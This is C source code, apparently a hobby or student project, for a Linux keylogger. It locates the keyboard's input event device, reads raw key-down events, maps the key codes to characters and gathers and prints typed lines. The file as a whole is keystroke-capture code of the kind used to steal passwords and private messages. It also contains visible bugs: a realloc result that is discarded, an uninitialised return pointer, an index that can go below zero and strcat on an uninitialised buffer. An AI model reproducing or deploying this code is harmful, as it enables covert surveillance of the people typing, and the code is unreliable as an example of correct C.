#include "config.h"

/*
        Returns 1 for file does not exist, and 0 otherwise.
*/
int checkFileExists(FILE *inputFile) {
        if (inputFile == NULL) {
                perror("Error opening file");
                return 1;
        }

        return 0;
}

/*
        getEvent takes in the file found at DEVICES global variable,
        opens the file, then reads line by line till it hits whichever
        event is KEYBOARDNAME, gets the event number, and then reserves
        memory to return it as a character pointer.
*/
char* getEvent() {
        // Open a given file
        FILE *file = fopen(DEVICES, "r");
        if (checkFileExists(file) == 1) {return NULL;};

        // Create a line buffer
        char line[256];
        char* finalToken;
        int reached_keyboard = 0;

        while (fgets(line, sizeof(line), file)) {
                // Check if we hit keyboard entry
                if (strstr(line, "AT Translated Set 2 keyboard") != NULL) {
                        reached_keyboard = 1;
                }

                // Check if we hit the handlers line
                if (reached_keyboard == 1 && strstr(line, "Handlers") != NULL) {
                        // The field we are looking for is the fourth token.
                        char *token = strtok(line, "=");
                        token = strtok(NULL, " ");
                        token = strtok(NULL, " ");
                	token = strtok(NULL, " ");

			finalToken = (char*)malloc(strlen(token) + 1);

                        // Copy token if memory is allocated correctly.
                        if (finalToken != NULL) {
                                strcpy(finalToken, token);
                        }
                        break;
                }

                // If we dont have it at all, then just move on. The next line begins with I:
                if (strstr(line, "I:") == line) {
                        reached_keyboard = 0;
                }
        }

        // Close the file
        fclose(file);

        // Return final token
        return finalToken;
}

/*
	Takes in the index of the character from linux mapping, and the current
	index of the array.

	Returns 1 for success, 0 for do nothing, and -1 for end.
*/
int interpretCharacter(char* outputBuffer, struct input_event *eventInput, int *bufferIndex) {
	// Linux keymap based on qwerty keyboard.
	char *keymap = "..1234567890-=..QWERTYUIOP[]..ASDFGHJKL;'`.\\ZXCVBNM,./... .";

	switch (eventInput->code) {
		case 14:
			// Delete (Move index back one)
			(*bufferIndex) -= 1;
			return 0;
		case 28:
			// New line
			outputBuffer[*bufferIndex] = '\n';
			outputBuffer[*bufferIndex + 1] = '\0';
			return -1;
		default:
			// Everything else
			// Get and set character entry.
			char entry = keymap[eventInput->code];

			if (entry != '.') {
	                	outputBuffer[*bufferIndex] = entry;
	                	(*bufferIndex) += 1;
			}

			return 1;
	}
}

/*
        Takes in argc, argv, and an event name to read from
        and opens INPUTSTREAM/eventName. Uses a predefined keymap
        found at linux/input.h that does not update if that keymap changes.

        Creates a while loop non-asyncroniously to read every input from user
        and if it is a character we want to read adds it to our buffer. Buffer is
        returned when a newline is reached. Currently works based on key down, but
        can be switched to listen for key up.

        Return starts at 128 Bytes, and doubles every time it gets within
	25 characters of that limit.
*/
char* inputBuffer(int argc, char **argv, char *eventName, int *temporaryBufferCount) {
        // Output buffer
        char *outputBuffer = (char*)malloc(sizeof(char) * BUFFER_SIZE);
        int bufferIndex = 0;
        int currentBuffer = BUFFER_SIZE;

        // Create a buffer for our target location.
        char fileNameBuffer[256] = INPUTSTREAM;
        strcat(fileNameBuffer, eventName);

        // Create an input event that we can use to access keypresses
        struct input_event eventInput;
        int inputLogger = open(fileNameBuffer, O_RDONLY);
        // Linux keymappings

        while(1) {
                // Read from input file
                read(inputLogger, &eventInput, sizeof(eventInput));

                // value 0 is down, value 1 is up
                if (eventInput.type == EV_KEY && eventInput.value == 0) {
                        printf("Keyboard input\n");
			int result = interpretCharacter(outputBuffer, &eventInput, &bufferIndex);
			/*
				1 : Success
				0 : Delete
			       -1 : Finished
			*/
			switch (result) {
				case 1:
					break;
				case 0:
					break;
				case -1:
					// End
					return outputBuffer;
			}
                }

		// Handle too much memory
	        if (bufferIndex > currentBuffer - BUFFER_SOFT_CAP) {
	                // Taken from Connor's code:
	                // Reallocates the memory into a temporary variable if limit is near
	                char *outputBuffer = realloc(outputBuffer, sizeof(char) * currentBuffer * BUFFER_INCREASE);

	                // Double buffer max.
	                currentBuffer *= 2;
			*temporaryBufferCount *= 2;
		}

        }
}

int main(int argc, char **argv) {
        // Access which entry holds our keyboard
        char* result = getEvent();
	char* lineBuffer = (char *)malloc(sizeof(char) * BUFFER_SIZE);
        int lineCounter = 0; // Keeps track of how many lines have been recieved by the
			     // inputBuffer function
	int lineBufferSize = sizeof(char) * BUFFER_SIZE;

	/*
                Loop Sequence:
                        - Recieve input buffer (terminated by \n)
                        - Garbage Collect
                        - Wait for next input
        */

	printf("Dead\n");
        while (lineCounter <= BUFFER_GOAL) {
		printf("Alive\n");

               // Begin tracking an input buffer for key presses on that event
                int temporaryBufferCount = BUFFER_SIZE;
		char* recievedBuffer = inputBuffer(argc, argv, result, &temporaryBufferCount);

		// Update lineBufferSize for temporaryBufferCount increase
		lineBufferSize += temporaryBufferCount + 10;
		lineBuffer = realloc(lineBuffer, sizeof(char) * lineBufferSize);

		// Add
		strcat(lineBuffer, recievedBuffer);
		printf("%s", lineBuffer);

                // Garbage collection
                if (recievedBuffer != NULL) {
                        free(recievedBuffer);
                        recievedBuffer = NULL;
                }

		// Loop Terminal
		lineCounter += 1;
        }

        // Free result
        free(result);
        result = NULL;

        // End of file
        return 0;
}
